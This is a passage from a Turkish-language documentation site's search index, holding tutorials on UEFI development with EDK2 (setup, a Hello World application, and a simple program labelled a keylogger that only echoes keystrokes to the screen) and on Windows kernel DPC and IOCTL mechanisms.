değişkenlerini kullanarak birbirleriyle nasıl iletişim kurabileceğini gösterdik. UEFI’de SetVariable ve GetVariable ve Windows’ta ExGetFirmwareEnvironmentVariable / ExSetFirmwareEnvironmentVariable’dan yararlanarak, iki ortam arasında kalıcı ve güvenilir bir veri kanalı kurduk.\nBu yöntem, geliştiricilerin ürün yazılımı ve işletim sistemi arasında sorunsuz entegrasyonlar oluşturmasına olanak tanıyarak yeniden başlatmalarda esnek yapılandırmalara, özellik geçişlerine veya telemetri mekanizmalarına izin verir.\nReferences UEFI.org - Runtime Services\nTianoCore Docs - GetVariable() and SetVariable()"},"title":"UEFI to Windows Communication via NVRAM Variables"},"/tr/docs/uefi-dev/uefi-introduction/":{"data":{"":"","hello-uefi-world#\u003cstrong\u003eHello UEFI World!\u003c/strong\u003e":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":"Merhabalar efenimm. UEFI Development’ın ilk bu dökümanında UEFI konusuna teorik olarak giriş yapacağız.\nDün gece boş boş duvara bakma aktivemi gerçekleştirirken “hayatımı daha da nasıl mahvedebilirim” diye düşünürken aklıma UEFI Development’a girişmek aklıma geldi. Gerçekten uzun zamandır ilgilenmek istediğim bir alandı ve hayatımı daha derine ve kötüye götürmek için efsane bir fırsat olduğunu düşünerek şuan bu blogu yazıyorum.\nUEFI Nedir? Direkt olarak kodlamaya girişmek olmaz. Bazı temel şeyleri öğrenmemiz gerekecek.\nKabaca bizim hayatımızı mahvedecek bu UEFI (Unified Extensible Firmware Interface), bir bilgisayarın firmware’i için bir spesifikasyondur. UEFI bir Bilgisayarın güç tuşuna basıldığı ilk süreçlerde UEFI, işletim sistemi başlatılmadan önce çalışır.\nUEFI dediğimiz bu şeyi eski BIOS sistemin geliştirilmiş hali olduğunu düşünebiliriz. UEFI modelleri ayrıca donanıma etkileşim için temel I/O sistemlerine de sahiptir ancak sistem önyükleme işlemleri farklıdır. UEFI GPT (Guid Partition Table) kullanır. GPT, bir bilgisayarın depolama cihazındaki bölümlerin düzenini belirleyen ve modern yapısı olan bir standarttır. Hepimizin bildiği HDD veya SSD gibi cihazlarda kullanılan standarttır. BIOS’un yerini alan UEFI gibi, GPT ise de önceden kullanılan MBR (Master Boot Record) bölümleme tablosunun yerini almıştır. GPT ile UEFI uyumlu çalışır.\nUEFI ve GPT birleştirdiğimizde elde edilen avantajlar şu şekildedir:\n2TB veya daha büyük diskleri desteklemek Daha hızlı Booting İşlemi Eski BIOS’a kıyasla daha da basitleştirilmiş geliştirme sunma Gibi şeyler vs. Yani UEFI ve GPT’nin eski sistemlere kıyasla daha avantaj sunduğunu görebiliriz.\nUEFI’in BIOS ile aynı görevleri vardır: I/O cihazlarını çalıştırmak ve kontrolü OS’a aktarmak. Fakat görevi sadece bununla sınırlı kalmayıp ve yukarıda anlattığım gibi, aynı zamanda işletim sistemi öncesi yani pre-OS geliştirme için geniş bir yelpaze sunar.\nAşağıda gösterilen Legacy BIOS ve UEFI arasındaki farkı gösteren şemaya göz atalım:\nŞemaya göz attığımızda BIOS, donanım ile doğrudan iletişim kuran bir firmware ve aynı zamanda bir donanımdır. Şemadan UEFI’ye göz attığımızda donanım ile işletim sisteminin arasındaki arayüzü birleştirdiğini görebiliriz. UEFI’nin bu işlevi, geliştiriciler için kolaylık sağlar.\nKısacası UEFI’ye göz attığımızda GPT ile beraber eski Legacy BIOS’a kıyasla daha modern ve hızlı bir süreç sunduğunu görmemiz mümkün.\nUEFI Önyükleme Süreci UEFI bir bilgisayarın güç tuşuna bastıktan sonrasında logo görülmeden önce arka planda neler gerçekleştiğine bir de yakından göz atalım.\nUEFI, platformun başlatılması sürecinde kritik öneme sahip altı ana önyükleme aşamasına sahiptir:\nSecurity (SEC): Security aşaması, UEFI önyükleme sürecin ilk aşamasıdır. Genel amacı ise Geçici Bellek Deposunu başlatmak, Sistemde root of trust olarak hareket etmek ve Pre-EFI çekirdek aşamasına bilgi sağlamaktır. Bahsi geçen Root of Trust ise tam olarak şöyledir: SEC mekanizması ayrıca PI’da çalıştırılan herhangi bir kodun dijital olarak imzalanmasını sağlayan ve ‘Secure Boot’ ortamı yaratan bir mekanizma olarak da işlev görür.\nPre-EFI Initialization (PEI): İkinci aşamada, EFI kodunun çalışması sağlanır. Ana görevi ise bir sonraki aşama olan ve DXE sürücülerini başlatacak olan DXE Foundation’ı indirmektir. Ayrıca işlemci kaynaklarını kullanarak Pre-EFI Initialization Modules (PEIM)’leri dispatch etmekten sorumludur. Bu PEIM’ler, bazı kalıcı bellek tamamlayıcılarının başlatılması gibi kritik süreçlerden sorumlu olduğu gibi bir sonraki aşama olan Driver Execution Environment (DXE)’e geçişi sağlar.\nDriver Execution Environment (DXE): Bu aşamanın gerçekten önemli olduğunu düşünüyorum çünkü sistemi başlatmak için gerekli büyük işlemler burada gerçekleşiyor. Bir önceki aşamada olan PEI’de, DXE’nin çalışması için gereken bellek tahsis edilir ve başlatılır. Artık kontroller DXE’e aktarılmasıyla DXE Dispatcher çağırılır. Bu Dispatcher, donanım sürücülerini, runtime hizmetlerini ve işletim sisteminin başlaması için gereken tüm önyükleme hizmetlerini yüklemesinden ve yürütmesinden sorumludur. Amacımızı düşünürsek, önceden dediğim gibi burası bizim için önemli bir aşamadır. Çünkü geliştireceğimiz sürücü burada çalıştırılacaktır.\nBoot Device Selection (BDS): DXE sürücüleri çalıştırılması ardından kontrol, muhtemelen hepinizin gördüğü BSD’ye aktarılır. Bu aşamada ise işletim sistemi yükleyicisinin hangi aygıtta aranacağına dair bir seçim yapılır. Ardından işletim sistemi yüklenmeye başlanır ve Transient System Load (TSL) aşamasına geçiş için hazırlanılır.\nTransient System Load (TSL): Bu aşamada, seçilen önyükleme yükleyicisinin çalıştığı ve UEFI önyükleme hizmetlerinin sonlandırıldığı aşamadır.\nRuntime (RT): Bu aşamada ise artık UEFI’nin akışı işletim sistemine devrediliyor. Fakat UEFI bu kısımdan itibaren tamamen ortadan kaybolduğu anlamına gelmez. UEFI’ye ait olan Runtime Services (Runtime Hizmetleri) işletim sistemini desteklemek için kullanılabilir durumda kalmaya devam eder. Bu Runtime hizmetleri, donanımla ilgili bazı özel işler için System Management Mode (SMM) devreye girer. SMM, işlemcinin kritik donanım işlevlerini işletim sisteminden bağımsız olarak yönettiği güvenli bir moddur. Örneğin, fan hızının ayarlanması veya batarya durumunun izlenmesi gibi işlemler bu modda yapılır. Eğer İşletim sistemi, donanımla ilgili bir işi kendi başına yapamazsa, SMI (System Management Interrupt) adı verilen bir sinyal gönderir. Bu, “yardım çağrısı” gibidir. Örneğin, işletim sistemi fan hızını kontrol etmek istediğinde bir SMI gönderir, SMM devreye girer ve bu işi halleder.\nUEFI Development’a Giriş Gelelim önemli bu kısma.\nSöz konusu UEFI Development için kaynak olduğunda gerçekten bu süreçte kaynakların kısıtlı olduğunu göreceksiniz. Popüler olarak Development sürecinde, aşağıda sıralanan araçlar kullanılabilir:\nEDK2: EDK2, UEFI ve PI spesifikasyonlar için modern, zengin ve platformlar arası kodlama gibi özelliklerine sahip bir araçtır. EDK2 projesi, UEFI spesifikasyonuna katkıda bulunan geliştiricilerin birçoğu tarafından (topluluk gönüllüleriyle birlikte) geliştirilmekte ve günümüzde sürdürülmektedir. Bu blog sürecinde ise kodlamayı bununla yapacağız. EDK2’nin en son UEFI protokollerini içerdiğinden bu araç son derece yararlıdır. Buna ek olarak, öğrenme sürecinde rehber olarak kullanabileceğimiz projeler çok fazladır.\nVisualUEFI VisualUEFI aracı, Windows kullanıcıları için Visual Studio IDE ile EDK2 projeleri geliştirmesine imkan veren bir araçtır. EDK2 projesinin karmaşık düzeninden kurtulmak ve rahat bir şekilde çalışmak isterseniz bu aracı tercih edebilirsiniz. Windows kullanıcısı olsam da bu blog sürecinde VisualUEFI’ye yer vermeyeceğim. VisualUEFI kodlama için rahat bir ortam sunsa da, benim için EDK2 gibi projelerin düzenini manuel olarak uğraşmak daha rahat oluyor. Eğer VisualUEFI’yi kurmak isterseniz internette birçok kaynak bulunmakta.\nProjelerimizi geliştirdikten sonra bunları simüle etmemiz gerekecek. Bunun için aşağıdakilerden biri kullanılabilir:\nQEMU: QEMU’nun zaten ne olduğunu biliyorsunuzdur. Bir sanal makineden ziyade bir emülatör olması nedeniyle iyi bir debugging olanaklarını sağlayan çok platformlu bir emülatör. Linux veya Windows ortamında bunu tercih edebilirsiniz.\nVMWare / VirtualBox: Vmware, VirtualBox gibi sanal makineleri de tercih edebilirsiniz.\nBu süreçte ise simüle için VMWare’i tercih edeceğim. Özellikle VMware’in doğru çalışan NVRAM emülasyonu ile iyi performans sunar. Benim için en önemli sunduğu özellik ise Windows’ta TSL ve RT aşamalarında debugging için WinDbg ile güzel çalışması.\nWindows’ta EDK2’nin Kurulumu EDK2 projesini kurmadan önce aşağıdaki araçları kurmamız lazım:\nGit Python NASM Visual Studio Öncelikle git indirelim ve ardından Python’u indirelim. Python’u Microsoft Store yerine direkt olarak orijinal sitesinden indirin ve kurulumda ise aşağıda gösterilene dikkat edin:\nFotoğrafta gösterilmiş alandaki kutucukları işaretlemeyi unutmayın.\nDaha sonra NASM’ı orijinal sitesinden indirelim ve indirdiğimiz .exe dosyasını yönetici ile çalıştıralım:\nKurulum esnasında NASM projesinin lokasyonunu C:\\NASM olarak ayarlayalım.\nNASM kurulumundan sonra ise Windows’un Enviroment Variables ayarından User Variables için NASM_PREFIX adında bir değişken oluşturalım:\nDeğeri C:\\NASM\\ olarak ayarlayalım.\nDaha sonra Visual Studio’nın C++ araçlarını kurmamız gerekecek. Bu araçları indirmek için Downloads sayfasından Build Tools araması yapalım:\nTools for Visual Studio olanı indirelim ve ardından:\nKurulumda Desktop Development with C++ olanı seçelim ve kurulumu başlatalım.\nBunları tamamladıktan sonra cmd.exe açalım ve edk2 projesini kuralım:\ngit clone https://github.com/tianocore/edk2.git cd edk2 git submodule update --init edk2 projesini de indirdikten sonra Developer Command Prompt VS 2022 aracını açalım ve daha sonra indirdiğimiz edk2 projesine gidelim. Config/target.txt’i notepad ile açalım:\nnotepad Conf\\target.txt Bu .txt içerisinde, aşağıda size gösterdiğim değerler ile değiştirin:\nACTIVE_PLATFORM = ShellPkg/ShellPkg.dsc ... TARGET = RELEASE ... TARGET_ARCH = X64 ... TOOL_CHAIN_TAG = VS2022 Aynen böyle olacak şekilde değerleri değiştirin ve kaydedip kapatabilirsiniz. Daha sonra edksetup.bat‘ı çalıştıralım:\n\u003e C:\\edk2\u003eedksetup.bat ... WORKSPACE = C:\\edk2 EDK_TOOLS_PATH = C:\\edk2\\BaseTools BASE_TOOLS_PATH = C:\\edk2\\BaseTools EDK_TOOLS_BIN = C:\\edk2\\BaseTools\\Bin\\Win32 CONF_PATH = C:\\edk2\\Conf PYTHON_COMMAND = py -3 PYTHONPATH = C:\\edk2\\BaseTools\\Source\\Python; !!! WARNING !!! NASM_PREFIX environment variable is not set Found nasm.exe, setting the environment variable to C:\\nasm\\ !!! WARNING !!! CLANG_BIN environment variable is not set !!! WARNING !!! No CYGWIN_HOME set, gcc build may not be used !!! Daha sonra araçları derlemek için BaseTools dizinine gidelim:\n\u003e C:\\edk2\u003ecd BaseTools \u003e C:\\edk2\\BaseTools\u003enmake Araçları derledikten sonra tekrar ana dizine dönelim ve Build komutunu çalıştıralım:\n\u003e C:\\edk2\\BaseTools\u003ecd .. \u003e C:\\edk2\u003eBuild ... - Done - Build end time: 13:14:44, Jan.28 2025 Build total time: 00:02:03 Derlemeden sonra Done çıktısını almamız gerekiyor.\nHello UEFI World! Artık UEFI sürücüsü geliştirmek için gerekli her şeye sahibiz. Programlama geleneğine uygun davranarak “Hello UEFI World” çıktısı veren basit bir proje geliştirelim. Geliştireceğimiz projeleri ShellPkg/Application dizin altında oluşturabiliriz.\nBir sürücü geliştirirken .c projesinin olması yanı sıra bir de .inf dosyası oluşturmamız gerekiyor. Bu INF dosyası, modülü oluşturmak ve paketlemek için gerekli bilgileri sağlar. Yani sürücümüzün paketlenmesi için gerekli bilgiler sağlayacağız.\nedk2/ShellPkg/Application dizini altında HelloWorld adında bir klasör oluşturalım ve ardından HelloWorld.c projemizi kodlamaya başlayalım:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e #include \u003cLibrary/PcdLib.h\u003e EFI_STATUS EFIAPI UefiMain ( IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable ) { Print (L\"Hello UEFI World!\\n\"); return EFI_SUCCESS; } Bazı detaylar haricinde kodlar bizlere yabancı gelmeyecektir.\nMain fonksiyon için kodlamalarımızı UefiMain içerisinde yapacağız. UefiMain, UEFI sürücülerin başlangıç noktasıdır. Geleneksel main fonksiyonuna benzer şekilde, bir UEFI uygulamasının giriş noktasıdır. UefiMain iki parametre alır:\nImageHandle: Uygulamanın UEFI firmware tarafından temsil edilen benzersiz bir tanımlayıcısıdır.\nSystemTable: UEFI sisteminde tanımlanan çeşitli hizmetlere ve tablolara erişim sağlayan bir veri yapısıdır.\nKodlara biraz detaylı göz attığınızda tıpkı benim gibi syntax’ın farklılığı yüzünden eliniz ayağınız titremiş olabilir (örneğin çağırılan Print ile parantez arasına boşluk bırakılması vs). İlk başta benim gibi hatalı bir syntax olduğunu düşünseniz de hatalı değil. Bu EDK2 topluluğuna ait C kodu tipiyle alakalıdır:\nİlgili blogta syntax kurallarına göz atabilirsiniz. Aklınızda bulunsun eğer ileride edk2 projesine katkıda bulunursanız bu syntax kuralına dikkat edin. Madem edk2’den yararlanacağız kurallarına uyalım değil mi?\nDaha sonra HelloWorld.inf adında bir proje daha oluşturalım:\n[Defines] INF_VERSION = 0x00010006 BASE_NAME = HelloWorld MODULE_TYPE = UEFI_APPLICATION VERSION_STRING = 1.0 ENTRY_POINT = UefiMain [Sources] HelloWorld.c [Packages] MdePkg/MdePkg.dec ShellPkg/ShellPkg.dec MdeModulePkg/MdeModulePkg.dec [LibraryClasses] UefiApplicationEntryPoint UefiLib PcdLib .inf dosyasını da kodladıktan sonra her şey tamam ancak derlemeye geçmeden önce /edk2/ShellPkg/ShellPkg.dsc içerisine projemizi eklememiz gerekecek:\n...\r[Components]\r#\r# Build all the libraries when building this package.\r# This helps developers test changes and how they affect the package.\r#\rShellPkg/Library/UefiShellLib/UefiShellLib.inf\rShellPkg/Library/UefiShellAcpiViewCommandLib/UefiShellAcpiViewCommandLib.inf\rShellPkg/Library/UefiShellCommandLib/UefiShellCommandLib.inf\rShellPkg/Library/UefiShellCEntryLib/UefiShellCEntryLib.inf\rShellPkg/Library/UefiHandleParsingLib/UefiHandleParsingLib.inf\rShellPkg/Library/UefiShellBcfgCommandLib/UefiShellBcfgCommandLib.inf\rShellPkg/Library/UefiShellLevel1CommandsLib/UefiShellLevel1CommandsLib.inf\rShellPkg/Library/UefiShellLevel2CommandsLib/UefiShellLevel2CommandsLib.inf\rShellPkg/Library/UefiShellLevel3CommandsLib/UefiShellLevel3CommandsLib.inf\rShellPkg/Library/UefiShellDriver1CommandsLib/UefiShellDriver1CommandsLib.inf\rShellPkg/Library/UefiShellInstall1CommandsLib/UefiShellInstall1CommandsLib.inf\rShellPkg/Library/UefiShellDebug1CommandsLib/UefiShellDebug1CommandsLib.inf\rShellPkg/Library/UefiShellNetwork1CommandsLib/UefiShellNetwork1CommandsLib.inf\rShellPkg/Library/UefiShellNetwork2CommandsLib/UefiShellNetwork2CommandsLib.inf\rShellPkg/Application/HelloWorld/HelloWorld.inf Yukarıda gösterildiği gibi Components altına HelloWorld projenizi ekleyin\nŞimdi ise projemizi derleyelim:\nBuild -m ShellPkg\\Application\\HelloWorld\\HelloWorld.inf Derlemeden sonra efi dosyamız /edk2/Build/Shell/RELEASE_VS2022/X64 dizini altında ‘HelloWorld.efi’ olarak oluşturulacaktır.\nSürücüyü Çalıştırma Önceden de bahsettiğim gibi simüle işlemleri için VMWare ortamını kullanacağım. Eğer benim gibi VMware veya VirtualBox vs. kullanacaksınız FAT32 ile biçimlendirilmiş bir USB Flash gerekecek. FAT 32 Biçimlendirmeden sonra USB Flash içerisinde efi/boot olarak bir dizin oluşturun.\nYine /edk2/Build/Shell/RELEASE_VS2022/X64 dizini altında iki shell dosyası olacak:\nBuradan herhangi birini efi/boot dizini altında bootx64.efi olarak kopyalayın. Daha sonra HelloWorld.efi dosyasını da kök dizine kopyalayın.\nBu işlemlerden sonra USB Flash’ın içeriği aşağıda gösterildiği gibi olmalı:\nHelloWorld.efi efi boot bootx64.efi Sanal makineyi başlatalım ve aşağıdaki adımları gerçekleştirelim:\nRemovable Devices \u003e USB Flash Belleğiniz \u003e Connect seçeneğine tıklayalım.\nSanal makineyi yeniden başlatalım ve açılışta DEL tuşuna basalım:\nBoot Manager ekranından USB Flashımızı seçelim. Bu kadar basit!\nŞimdi ise HelloWorld sürücümüzü çalıştıralım:\nBaşarıyla ‘Hello UEFI World’ çıktımızı alıyoruz.\nSonuç Evet arkadaşlar bu dökümanda temel olarak UEFI’nin ne olduğunu, Windows’ta EDK2 kurulumunu ve basitçe UEFI sürücüsü ile ‘Hello UEFI World’ çıktısı veren bir proje geliştirdik. Umarım faydalı olmuştur.\nKonuları daha detaylı öğrenmek isterseniz referanslarda verdiğim kaynaklara göz atabilirsiniz.\nİyi çalışmalar dilerim efenimm.\nReferences Wikipedia - UEFI Dabudabot - Beginning UEFI Development Secret Club - Introduction to UEFI: Part 1 Binary Ninja - Advanced UEFI Analysis with Binary Ninja ","sonuç#\u003cstrong\u003eSonuç\u003c/strong\u003e":"","sürücüyü-çalıştırma#\u003cstrong\u003eSürücüyü Çalıştırma\u003c/strong\u003e":"","uefi-development#\u003cstrong\u003eUEFI Development\u0026rsquo;a Giriş\u003c/strong\u003e":"","uefi-nedir#\u003cstrong\u003eUEFI Nedir?\u003c/strong\u003e":"","uefi-önyükleme-süreci#\u003cstrong\u003eUEFI Önyükleme Süreci\u003c/strong\u003e":"","windows#\u003cstrong\u003eWindows\u0026rsquo;ta EDK2\u0026rsquo;nin Kurulumu\u003c/strong\u003e":""},"title":"Introduction to UEFI"},"/tr/docs/uefi-dev/uefi-keylogger/":{"data":{"":"","kodlama#\u003cstrong\u003eKodlama\u003c/strong\u003e":"","sonuç#\u003cstrong\u003eSonuç\u003c/strong\u003e":"Merhabalar. Bu blogta UEFI’de basit bir keylogger geliştireceğiz. Bir önceki blogta temel olarak UEFI’yi anlamıştık ve edk2 kurulumunu tamamlamıştık ve ardından bir adet gereği “Hello World” çıktısı veren sürücü yazmıştık. Artık basit projeler geliştirebilir hale geldik.\nKabaca yapacağımız şey UEFI’de klavyeden basılan tuşları ekrana bastıran bir sürücü yazacağız.\nKodlama KeyLogger.c projesi oluşturalım ve aşağıdaki kodları yapıştıralım:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e EFI_STATUS EFIAPI UefiMain( EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable ) { EFI_SIMPLE_TEXT_INPUT_PROTOCOL *TextInput; EFI_INPUT_KEY Key; /* Protokole erişim sağla */ TextInput = SystemTable-\u003eConIn; Print (L\"UEFI Keylogger!\\n\"); while(1) { TextInput-\u003eReadKeyStroke ( TextInput, \u0026Key ); if (Key.ScanCode == SCAN_ESC) { Print (L\"ESC Button Detected\\n\"); break; } if (Key.UnicodeChar != 0) { Print (L\"Pressed: %c\\n\", Key.UnicodeChar); } } return EFI_SUCCESS; } Kodumuz oldukça basit. Detaylıca göz atalım:\nEFI_SIMPLE_TEXT_INPUT_PROTOCOL *TextInput; EFI_INPUT_KEY Key; Sürücümüzde EFI_SIMPLE_TEXT_INPUT_PROTOCOL protokolü ile bir pointer oluşturarak başlıyoruz. Bu pointer, klavyeden gelen girişleri yakalamak için kullanacağız. EFI_SIMPLE_TEXT_INPUT_PROTOCOL protokolü, klavye girişlerini okuma işlemini gerçekleştiren temel bir protokoldür.\nDaha sonra klavyeden basılan tuşları bir değişkene kaydetmek için EFI_INPUT_KEY tipinde bir değişken oluşturuyoruz.\nTextInput = SystemTable-\u003eConIn; Bu kısımda ise EFI_SIMPLE_TEXT_INPUT_PROTOCOL’e erişim sağlıyoruz. ConIn, Console Input Protocol (Konsol Giriş Protokolü) için kullanılan bir üye değişkendir.\nwhile(1) { TextInput-\u003eReadKeyStroke ( TextInput, \u0026Key ); if (Key.ScanCode == SCAN_ESC) { Print (L\"ESC Button Detected\\n\"); break; } if (Key.UnicodeChar != 0) { Print (L\"Pressed: %c\\n\", Key.UnicodeChar); } } Artık bir döngü ile basılan tuşları ekrana bastırmaya başlıyoruz. ReadKeyStroke ile basılan tuşları Key değişkenine aktarıyoruz.\nEğer basılan tuş ESC (SCAN_ESC) tuşuysa sürücünün döngüden çıkmasını sağlıyoruz. Eğer değilse basılan tuşu ekrana bastırıyoruz.\nSürücüyü Çalıştırma KeyLogger.inf dosyasını oluşturalım ve aşağıdaki kodları yapıştıralım:\n[Defines] INF_VERSION = 0x00010006 BASE_NAME = KeyLogger MODULE_TYPE = UEFI_APPLICATION VERSION_STRING = 1.0 ENTRY_POINT = UefiMain [Sources] KeyLogger.c [Packages] MdePkg/MdePkg.dec ShellPkg/ShellPkg.dec MdeModulePkg/MdeModulePkg.dec [LibraryClasses] UefiApplicationEntryPoint UefiLib Aşağıdaki kodla projemizi build edelim:\nBuild -m ShellPkg\\Application\\KeyLogger\\KeyLogger.inf Her şey tamam olduğuna göre sonuca bakabiliriz:\nGördüğünüz gibi klavyeden bastığım tuşlar ekrana bastırılıyor. ESC tuşuna basıldığında ise sürücü kapanıyor.\nSonuç Bu blogta UEFI sürücüsü ile basit bir Keylogger geliştirmeyi öğrendik. Blogun basit olduğunun farkındayım ancak daha yeni olduğumuz için ve UEFI projelerine adepte olabilmek için böyle basit projelerle ilerlemenin güzel olacağını düşünüyorum. İlerideki süreçlerde daha derin projelere girişeceğiz.","sürücüyü-çalıştırma#\u003cstrong\u003eSürücüyü Çalıştırma\u003c/strong\u003e":""},"title":"UEFI Keylogger"},"/tr/docs/winkernel-dev/":{"data":{"":"Windows Kernel Development ile ilgili konuları incelemek için aşağıdaki bölümlere göz atabilirsiniz:\nDeferred Procedure Call\rSystem Service Descriptor Table\rVirtual Memory\rDevice Input and Output Control\rI/O request packets"},"title":"Windows Kernel Dev."},"/tr/docs/winkernel-dev/wkd-dpc/":{"data":{"":"","#":"","proje#\u003cstrong\u003eProje\u003c/strong\u003e":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":" DPC (Deferred Procedure Call) Windows kernel’da bulunan bir mekanizmadır. Amacı, bir fonksiyonun daha sonra daha düşük bir IRQL’de (aşağıda detaylandırılacaktır) çalışmasını planlamak için kullanılır. Başka bir deyişle, Windows’un önemli işleri daha sonra halletmesi için bir yoldur. DPC, bir kesme meydana geldiğinde veya sistemin çok hızlı yanıt vermesi gerektiğinde kullanışlıdır. Bu nedenle, DPC kesinti işleyici gibi yüksek öncelikli görevlerin yürütülmesine, ancak daha sonra yürütülmek üzere daha düşük öncelikli görevlerin yürütülmesine izin verir.\nHer DPC, çekirdek tarafından oluşturulan ve başlatılan DPC Nesnesi ile ilişkilendirilir. Bir aygıt sürücüsü bir DPC isteği yayınlayabilir ve ardından DPC isteği DPC kuyruğunun sonuna eklenir. DPC Nesneleri IRQL‘in DISPATCH_LEVEL‘inde sıralanır. Ancak devam etmeden önce IRQL konusuna bir göz atalım.\nIRQL ‘IRQL’ (Interrupt Request Level) terimi, basitçe bir CPU’nun herhangi bir zamanda çalıştığı mevcut donanım önceliğini tanımlar. Bunun için, her donanımın belirli bir istek seviyesine karşılık geldiği haritalar vardır. İşte X64 için bir harita:\nNumber Name 15 High/Profile 14 Inter-Processor Interrupt 13 Clock 12 Synch Device[n] . . Device[1] 2 Dispatch/DPC 1 APC 0 Passive/Low Mevcut çalışan iş parçacığı, CPU durumunu kaydeden ve gelen IRQL ile eşlenen Kesme Hizmeti Rutinini (ISR) işleyen bu kesintileri ele almaktan sorumludur. Her bir kesme rutini Kesme Açıklama Tablosunda (IDT) listelenmiştir. Bu tabloyu Windbg ile dökebiliriz:\nBu kafa karıştırıcı gibi gözülen çıktıda vektör numaralarını, adresleri ve ntoskrnl rutinlerini görebiliriz. Örneğin, KiDivideErrorFault’un gölgesi olan 0x0 KiDivideErrorFaultShadow vektörü, Kullanıcı Modu veya Çekirdek Modu Alanından bir bölme işlemi hata ile sonuçlandığında çağrılır.\nBaşka bir örnek, listenin devamında CPU Clock görebiliriz:\nd1:\tfffff805d0cd2948 nt!HalpTimerClockInterrupt (KINTERRUPT fffff805d0f60a40) Böylece, IRQL seviyesinin X64 tablosundaki 13. değere karşılık gelip gelmediğini doğrulayabiliriz:\nKINTERRUPT yapısı ise kernel bellek yapısıdır ve interrupt hakkında önemli bilgiler tutar:\nkd\u003e dt _KINTERRUPT nt!_KINTERRUPT +0x000 Type : Int2B +0x002 Size : Int2B +0x008 InterruptListEntry : _LIST_ENTRY +0x018 ServiceRoutine : Ptr64 unsigned char ... Bu çıktıda, anahtar üyemiz 0x18 ofsetindeki ServiceRoutine’dir. Bu pointer, ilişkili interrupt tetiklendiğinde, çalıştırılacak olan Interrupt Service Routine (ISR) adresini tutar.\nProje Basit bir proje ile bu konuyu daha iyi anlayabiliriz:\n#pragma warning(error:28251) #include \"main.h\" VOID DpcRoutine( _In_ struct _KDPC* Dpc, _In_ PVOID DeferredContext, _In_ PVOID SystemArgument1, _In_ PVOID SystemArgument2 ) { UNREFERENCED_PARAMETER(Dpc); UNREFERENCED_PARAMETER(DeferredContext); UNREFERENCED_PARAMETER(SystemArgument1); UNREFERENCED_PARAMETER(SystemArgument2); DbgPrintEx(0, 0, \"DPC routine executed\\n\"); } NTSTATUS DriverUnload(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Driver Unload\\n\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); DriverObject-\u003eDriverUnload = DriverUnload; DbgPrintEx(0, 0, \"Starting Driver...\\n\"); KDPC DpcObject; /* Initialize Dpc Object */ KeInitializeDpc(\u0026DpcObject, DpcRoutine, NULL); /* Queue the DPC */ KeInsertQueueDpc(\u0026DpcObject, NULL, NULL); return STATUS_SUCCESS; } Kodlarımız bu şekilde.\nİlk olarak projede DPC Object’i KeInitializeDpc ile initialize ederek başlıyoruz:\nKDPC DpcObject; /* Initialize Dpc Object */ KeInitializeDpc(\u0026DpcObject, DpcRoutine, NULL); KDPC yapısı ise basitçe DPC Object’ler için kullanılan bir yapıdır:\nkd\u003e dt _KDPC nt!_KDPC +0x000 TargetInfoAsUlong : Uint4B +0x000 Type : UChar +0x001 Importance : UChar +0x002 Number : Uint2B +0x008 DpcListEntry : _SINGLE_LIST_ENTRY +0x010 ProcessorHistory : Uint8B +0x018 DeferredRoutine : Ptr64 void +0x020 DeferredContext : Ptr64 Void +0x028 SystemArgument1 : Ptr64 Void +0x030 SystemArgument2 : Ptr64 Void +0x038 DpcData : Ptr64 Void Burada ise anahtar üyemiz DeferredRoutine olabilir. Bu üye DPC Rutininin adresini tutar. Bunu KeInitializeDpc kodlarında görebiliriz:\nrdx register’ı KeInitializeDpc’nin ikinci parametresini tutar ve bu değer DPC+DeferredRoutine’e aktarılır. KDPC yapısı 0x113 ofsetine karşılık gelir.\nDaha sonra, DPC Object’i KeInsertQueueDpc ile DPC’i çalıştırmak için kuyruğa ekliyoruz:\n/* Queue the DPC */ KeInsertQueueDpc(\u0026DpcObject, NULL, NULL); Ve sonra DPC’miz çalıştırılacaktır:\nYaptıklarımızı tekrar edersek, Bir driver, projede yaptığımız gibi KeInitializeDpc ‘yi çağırarak bir device object için bir rutin kaydeder bu fonksiyon bir create object oluşturur. Ardından Custom DPC’i (DpcRoutine fonksiyonumuz gibi) yürütmek için KeInsertQueueDpc ‘yi çağırılır:\nBu figür bize attığımız yaptığımız işlemleri daha iyi anlamamıza yardımcı olabilir.\nReferences Microsoft - Introduction to DPC objects Wikipedia - Deferred Procedure Call Offsec - IRQLs Close Encounters of the Rootkit Kind ired team - IDT Microsoft Docs - Registering and Queuing a CustomDpc Routine Microsoft Docs - Windows kernel opaque structures "},"title":"DPC"},"/tr/docs/winkernel-dev/wkd-ioctl/":{"data":{"":"","code#Code":"","ioctl-nedir#IOCTL Nedir?":"","references#References":"Merhabalar, bu yazıda Windows Kernel Development’tan IOCTL mekanizmasını inceleyeceğiz.\nIOCTL Nedir? I/O Control Codes (G/Ç Kontrol Kodları) olarak adlandırılan IOCTL, User-mode uygulamarın ve sürücülerin arasındaki iletişim için veya stack içerisindeki sürücüler arasındaki iletişim için kullanılan bir mekanizmadır. I/O Kontrol kodları, önceki konumda bahsettiğim IRP’ler aracılığıyla gönderilir. Eğer IRP’ler hakkında bir bilginiz yoksa buraya tıklayarak IRP’ler hakkında bilgi alabilirsiniz.\nWindows’ta User-mode programları, DeviceIoControl API kullanarak sürücülere IOCTL kodlarını gönderir. Bu API, alınan IOCTL kodunu IRP_MJ_DEVICE_CONTROL aracılığıyla sürücüye gönderir. Aynı zamanda IOCTL mekanizmanın tek özelliği de bu olmadığını tekrar vurgulayalım. İleri seviye sürücülerin IRP_MJ_DEVICE_CONTROL veya IRP_MJ_INTERNAL_DEVICE_CONTROL aracılığıya istek oluşturarak, alt sürücülere IOCTL isteği gönderme imkanı sunar.\nIOCTL kodları, genellikle sürücü geliştiricileri tarafından tanımlanan özel kodlar olabilir, ancak aynı zamanda Windows işletim sistemi tarafından belirli standart işlemler için önceden 